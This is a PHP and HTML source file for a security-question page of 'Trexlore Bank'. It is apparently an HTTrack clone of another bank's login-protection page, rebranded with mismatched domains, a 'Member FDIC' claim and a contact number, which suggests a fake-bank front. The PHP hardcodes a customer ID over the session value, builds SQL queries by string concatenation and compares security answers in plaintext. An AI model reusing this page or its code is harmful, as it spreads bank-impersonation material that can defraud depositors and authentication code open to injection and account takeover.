<?php
session_start();
$cust_id=$_SESSION['idcheck'];
$cust_id="161640367";
$message="";
require_once('Services/Twilio.php');
include "conn.php";
$sql=mysql_query("select * from act_holder_details where `customer_id`='".$cust_id."'");
$rows=mysql_num_rows($sql);
//print($rows);
while($dt = mysql_fetch_array($sql)) {
         	$q1=$dt["qid"];
         	$q2=$dt["qid2"];
         	$cust_name=$dt["cust_name"];
         	$account=$dt['cust_act_number'];
         	$email=$dt['cust_mail'];


         	}

if(isset($_REQUEST['submit']))

{


	//$user_id=$_SESSION['username'];

    //$ipin=$_SESSION['IPIN'];

	$ans1=$_REQUEST['ans1'];
	$ans2=$_REQUEST['ans2'];
	

	//echo "select * from act_holder_details where `user_id`='".$user_id."' AND `cust_password`='".$ipin."' AND `customer_id`='".$cust_id."'";

	$sql=mysql_query("select * from act_holder_details where `customer_id`='".$cust_id."'");
$rows=mysql_num_rows($sql);
while($dt = mysql_fetch_array($sql)) {
         	$ans=$dt["ans"];
         	$ans2db=$dt["ans2"];
         	;
           }
$rows=mysql_num_rows($sql);

	if($ans==$ans1 && $ans2==$ans2db)

	{
		///echo"mu";
$admin_email=mysql_fetch_object(mysql_query("SELECT * FROM `admin`"));
$admin_email=$admin_email->email;
  $to = $email; 
  

 $message="<table border='0' cellpadding='0' cellspacing='0' width='689'>
      <tbody>
        <tr>
          <td colspan='9' height='97'><div align='right'><img src='http://trexlorebk.com/logo.png'></div></td>
      </tr>

        <tr>

          <td width='549' colspan='7'><div align='right'>".date("F j, Y, g:i a")."</div></td>

        </tr>
<tr>

          <td colspan='9'><b>INTERNET BANKING LOG IN CONFIRMATION</b></td>

        </tr>
        <tr>

          <td colspan='9'><b> Dear Valued Customer </b></td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>


        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

        <tr>

          <td colspan='9'>Please be informed that your internet banking profile was accessed at ".date("F j, Y, g:i a")." </td>

        </tr>

        <tr>

          <td colspan='9'>If you did not log on to your internet banking profile at the time detailed above, please call our 24 hour interactive contact centre or send an email to e-fraudteam@enizbnkas.comimmediately.</td>

        </tr>
       

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

        <tr>

          <td width='130'> Account Name </td>

          <td width='10'> :</td>

          <td colspan='8' width='549'> $cust_name </td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

        <tr>

          <td width='130'> Account Number </td>

          <td width='10'> :</td>

          <td colspan='8' width='549'> $account </td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>
 <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

       
        <tr>

          <td colspan='9'> Thank you for choosing Trexlore Bank</td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

      </tbody>

    </table>"; 	 
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
 $headers .= 'From: '.$admin_email."\r\n";// From
 $subject  =  'INTERNET BANKING LOG IN CONFIRMATION' ; //Subject
echo $email;
if(mail($to,$subject,$message,$headers)){
	//echo "sent";
	header('Location: dashboard.php');
}
		?>

		 <?php	

	}

	else

	{
		$message="Wrong Answer of securityquestions!";

	?>

	 <?php	

	}

}

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"

	"http://www.w3.org/TR/html4/loose.dtd">

<HTML>

	<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<HEAD>

		<title id="HTMLTITLE">RoadBlock: Security Check</title>
<Meta name= "ROBOTS" CONTENT="NOINDEX, NOFOLLOW">


		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />

<Meta name= "ROBOTS" CONTENT="NOINDEX, NOFOLLOW">

		

		<link href="css/global_all.css" type="text/css" rel="stylesheet" media="all">

		<link href="css/standard_all.css" type="text/css" rel="stylesheet" media="all">

		<link href="css/global_print.css" type="text/css" rel="stylesheet" media="print">

		<link href="css/standard_print.css" type="text/css" rel="stylesheet" media="print">

		<link href="css/global_screen.css" type="text/css" rel="stylesheet" media="screen">

		<link href="css/standard_screen.css" type="text/css" rel="stylesheet" media="screen">

		<script type="text/javascript" src="js/common.js"></script>
<script type="text/javascript" src="js/pm_fp.js"></script>
</HEAD>

	<body onload="javascript: return post_prints();"><div id="bodycontainer">

			

			<div class="pageHeaderContainer">

				<div class="pageHeader">

					<table width="100%" border="0" cellspacing="0" cellpadding="0">

						<tr>

							<td valign="top" align="left">

								<div class="logo">

									<div class="screenOnly">

										<a href="index.php"><img name="logo" src="images/logo.png" width="250" height="75" alt="[ Trexlore Bank]"></a>

									</div>

									<div class="printOnly">

										<img src="gif/stdlogobw.gif" width="244" height="25" alt="[Trexlore Bank]">

									</div>

								</div>

							</td>

							<td align="right" valign="middle">

								<div class="secondaryNav">

									

									<a id="LNKHOME" href="../index.html" target="_blank">Home</a>

									<a id="LNKHELP" href="#http://www.#case/index-37.html" target="_blank">Help</a>

									

									<a id="LNKCONTACTUS" href="#https://#case/locations.html#" target="_blank">Contact Us</a>

															

								</div>

							</td>

						</tr>

						<tr>

							<td colspan="4" valign="bottom" align="left">

								<div id="divNavContainer" class="navigationContainer">

									

										<table width="100%" border=0 cellpadding="0" cellspacing="0" STYLE="background-image: url(/BOW/Themes/BOW/TopTabMenu/Images/bg_header.gif); background-repeat: repeat;">

											<tr>

												<td height="24">

													<IMG src="gif/bg_header.gif"></IMG>

												</td>

											</tr>

										</table>								

									

									

								</div>

							</td>

						</tr>

					</table>

				</div>

				<DIV class="pageSubHeader">

					

						<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0">

							<TR>

								<TD width="80%">

									<DIV class="lastLoginMessage">

										

									</DIV>

								</TD>

								<TD width="20%">

									

								</TD>

							</TR>

						</TABLE>

					

				</DIV>

			</div>

			<div class="pageBody">

				<form name="" method="post" autocomplete="off">

<script language="javascript" type="text/javascript">

<!--

	function __doPostBack(eventTarget, eventArgument) {

		var theform;

		if (window.navigator.appName.toLowerCase().indexOf("microsoft") > -1) {

			theform = document.MAINFORM;

		}

		else {

			theform = document.forms["MAINFORM"];

		}

		theform.__EVENTTARGET.value = eventTarget.split("$").join(":");

		theform.__EVENTARGUMENT.value = eventArgument;

		theform.submit();

	}

// -->

</script>

<Script language='JavaScript'>

					if (top!= self)

						top.location.href = self.document.location; 

					if (parent!= self) 

						{top.location.href = location.href} 

					if (top.frames.length!=0)

						top.location=self.document.location; 

					if (window!= window.top) 

						top.location.href = location.href;

					</Script>





					<input name="pm_sp" id="pm_sp" type="hidden" /> 

					<input name="pm_bp" id="pm_bp" type="hidden" />

					<input name="pm_swp" id="pm_swp" type="hidden" />

					<table id="MAINFORMTable" border="0" cellspacing="0" cellpadding="0" width="103%">

	<tr>

		<td align="left" valign="top" width="77%">

								<h1>Please Answer Security Questions!</h1>

							</td>

<h3 style="color: red"><?php  echo $message; ?></h3>
		<td valign="top" align="left" width="25%" rowspan="3">

								

								<br/>

								<table id="pnlCampaignManager" cellpadding="0" cellspacing="0" border="0" width="100%"><tr><td>

			

									<span id="CAMPAIGNMANAGER"></span>

									<span id="CAMPAIGNMANAGERAdSpace2"></span>

									<span id="CAMPAIGNMANAGERAdSpace3"></span>

									<span id="CAMPAIGNMANAGERAdSpace4"></span>

									<span id="CAMPAIGNMANAGERAdSpace5"></span>

									<span id="CAMPAIGNMANAGERAdSpace6"></span>

									<span id="CAMPAIGNMANAGERAdSpace7"></span>

									<span id="CAMPAIGNMANAGERAdSpace8"></span>						

									<span id="CAMPAIGNMANAGERAdSpace9"></span>						

								

		</td></tr></table>

							</td>

	</tr>

	<tr>

		<td align="center" valign="top" width="77%">

								

							</td>

	</tr>

	<tr>

		<td align="left" valign="top">

								<div class="instructionsContainer">

									<table border="0" cellspacing="0" cellpadding="0" width="100%">

										<tr>

											<td align="left" valign="top">

												

											</td>

											<td align="left" valign="top">

												

											</td>

										</tr>

									</table>

								</div>

								

	

			<script language="JavaScript" type="text/javascript">

				<!--

				var flashinstalled = 0;

				var flashversion = 0;

				MSDetect = "true";

				if (navigator.plugins && navigator.plugins.length) {

					x = navigator.plugins["Shockwave Flash"];

					if (x) {

						flashinstalled = 2;

						if (x.description) {

							y = x.description;

							flashversion = y.replace(/\D+/g, ",").split(",")[1];

						}

					}

					else

						flashinstalled = 1;

					if (navigator.plugins["Shockwave Flash 2.0"]) {

						flashinstalled = 2;

						flashversion = 2;

					}}

				else if (navigator.mimeTypes && navigator.mimeTypes.length) {

					x = navigator.mimeTypes['application/x-shockwave-flash'];

					if (x && x.enabledPlugin)

						flashinstalled = 2;

					else

						flashinstalled = 1;

				}

				else {

					MSDetect = "true";

				}

				//After the detect, the variable flashinstalled can have three values

				//2: Flash installed

				//1: Flash not installed

				//0: Unknown



				//the variable flashversion contains the version of the Flash. 

				//If the version is unknown, it is 0.

				// -->

			</script>

			<script language="vbscript">

				on error resume next



				If MSDetect = "true" Then

					For i = 2 to 6

						If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & i))) Then

						Else

							flashinstalled = 2

							flashversion = i

						End If

					Next

					If flashinstalled = 0 Then

						flashinstalled = 1

					End If

				End If

			</script>

			<!--

			Some browsers (like IE) support <object> to play the flash movie.

			Some browsers (like FireFox) need <embed> to play the flash movie.

			The script and noscript code blocks below uses both <object> and <embed>

			to play the flash movie that creates a pmdata fso.

			-->

			<!-- For browsers that allow scripting, play the flash movie to set the value for pmdata fso...-->

			<script language="JavaScript" type="text/javascript">

				<!--

					function setFSO(flashToken, pmFSO)

					{						

						if (flashinstalled == 2 && flashversion >= 6) 

						{

							var out = "";

							out = out + "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";

							out = out + "width='1' height='1'>" + "\n";

							out = out + "<param name='movie' value='" + pmFSO + "'>" + "\n";

							out = out + "<param name='quality' value='high'>" + "\n";

							out = out + "<param name='bgcolor' value='#FFFFFF'>" + "\n";

							

							//out = out + "<param name='FlashVars' value='pmdata=" + flashToken + "'>" + "\n";

							out = out + "<param name='FlashVars' " + getFlashVarsValue(flashToken) + ">" + "\n";



							//out = out + "<embed src='" + pmFSO + "'" + "\n";

							out = out + "<embed " + formatKeyValue('src', pmFSO) + "\n";

							

							//out = out + "FlashVars='pmdata=" + flashToken + "'" + "\n";

							out = out + "FlashVars=" + getPmData(flashToken) + "\n";



							out = out + "quality='low' bgcolor='#FFFFFF' width='1' height='1'" + "\n";

							out = out + "type='application/x-shockwave-flash'>" + "\n";

							out = out + "<noembed></noembed>" + "\n";

							out = out + "<noobject></noobject>" + "\n";

							out = out + "</embed>" + "\n";

							out = out + "<noobject></noobject>" + "\n";

							out = out + "</object>" + "\n";

							document.write(out);

						}

					}

					

					function getFlashVarsValue(flashToken)

					{	

						var text = "value='pmdata='";

						

						if (flashToken != null)

						{

							text = "value='pmdata=" + flashToken + "'";

						}



						return text;

					}

					

					function getPmData(flashToken)

					{	

						var text = "'pmdata='";

						

						if (flashToken != null)

						{

							text = "'pmdata=" + flashToken + "'";

						}

						

						return text;

					}					

					

					function formatKeyValue(key, value)

					{

						if (key == null)

						{

							key = "";

						}			

						

						if (value == null)

						{

							value = "";

						}		

						

						var text = key + "='" + value + "'";

						

						return text;

					}

					

					function getFSO(gotoUrlEnc, sendUrlEnc, pmFSO)

					{

						if (flashinstalled == 2 && flashversion >= 6) {

							//alert("Flash is Installed.");

							var out = "";

							out = out + "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";

							out = out + "width='1' height='1' id=OBJECT1>" + "\n";

							out = out + "<param name='movie' value='" + pmFSO + "'>" + "\n";

							out = out + "<param name='quality' value='high'>" + "\n";

							out = out + "<param name='bgcolor' value=#FFFFFF>" + "\n";

							out = out + "<param name='FlashVars' value='gotoUrl=" + gotoUrlEnc + "&sendUrl=" + sendUrlEnc + "'>" + "\n";

							out = out + "<embed src='" + pmFSO + "'" + "\n";

							out = out + "FlashVars='gotoUrl=" + gotoUrlEnc + "&sendUrl=" + sendUrlEnc + "'" + "\n";

							out = out + "quality='low' bgcolor='#FFFFFF' width='1' height='1'" + "\n";

							out = out + "type='application/x-shockwave-flash'>" + "\n";

							out = out + "<noobject></noobject>" + "\n";

							out = out + "</embed>" + "\n";

							out = out + "<noobject></noobject>" + "\n";

							out = out + "</object>" + "\n";

							document.write(out);

						} 

						else

						{

							//Flash Is Not Installed. - redirecting the user to Login.aspx page since movie is not played and if not 

							//redirected the user would say on RSALandingPage.aspx

							if (gotoUrlEnc != '') {

								window.location='Login.aspx';

							}

						}						

					}								

				//-->

			</script>





	<input name="hdnQuestionID" id="hdnQuestionID" type="hidden" />

	<table class="fullWidth" border="0">

			<tr>

				<td>

					<script>

					if (top!= self) 

						top.location.href = self.document.location; 

					</script>

					<P>

						<div class="instructions">Please Answer questions. We need you to answer the questions for your protection.</div></P>

					<P>

						<div class="instructions" nowrap>If you need additional assistance, please contact Online Banking Customer Support at +1 341 888 6555  , option 3.</div></P>

					<DIV class="formContainer">

						<DIV class="formInputContainer">

							<TABLE class="formTable">

								<TR class="item">

									<TD width="115">

										Answer of first Question:</TD>

									<TD width="189">
										<?php
										echo $q1;
										?>

										<input name="ans1" type="text" maxlength="20" id="ctlWorkflow_txtUserID" />

										

										

										</TD>

									

								</TR>
								<TR class="item">

									<TD width="115">

										Answer of second Security Question:</TD>

									<TD width="189">
										<?php
										echo $q2;
										?>

										<input name="ans2" type="text" maxlength="20" id="ctlWorkflow_txtUserID" />

										

										

										</TD>

									

								</TR>

							</TABLE>

						</DIV>

						<DIV class="formButtonContainer">

							<input language="javascript" onclick="__doPostBack('ctlWorkflow$btnStep1Cancel','')" name="CANCEL" id="ctlWorkflow_btnStep1Cancel" type="reset" class="inputButton" value="CANCEL" />

							<input type="submit" name="submit" value="SUBMIT" class="inputButton" />

						</DIV>

					</DIV>

				</td>

			</tr>

		</table>



								



							</td>

	</tr>

</table>



					<span id="CampaignCtrlMgr"></span>

					

				<script type='text/javascript'>

if (top != self) top.location = self.location;

</script>





	<INPUT id="TestJavaScript" type="hidden" name="TestJavaScript"><script language=javascript>document.getElementById("TestJavaScript").value="OK";var noCookieIndex = document.cookie.indexOf('TestCookie');if (noCookieIndex == -1) {document.getElementById("TestJavaScript").value='NOCOOKIE';}</script>



	<script language='javascript'> getFSO('', '%2fBOW%2fCustInfo%2fRSAStoreFSO.aspx', 'swf/pmfso.swf'); </script>



</form>

			</div>

			<div margin-left="100px" class="footerContainer">

				<table cellspacing="2" cellpadding="1px" align="left"  border="0" width="100%" style="border-bottom: 3px solid #c1bead;border-top: 3px solid #c1bead;">

					<tr>

						<td align="right" width="250" style="border-right: #999999 1px dotted;font-family :Arial;font-size:11px; text-decoration: none;color: #999;font-weight:bold;">

							Copyright© 2005-2017 Trexlore Bank. Member FDIC. Equal Housing Lender <img src='gif/logo_ehl.gif' width="17" height="13" border="0" />

						</td>

					</tr>

				</table>		

			</div>		

		</div>

	</body>

<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

</html>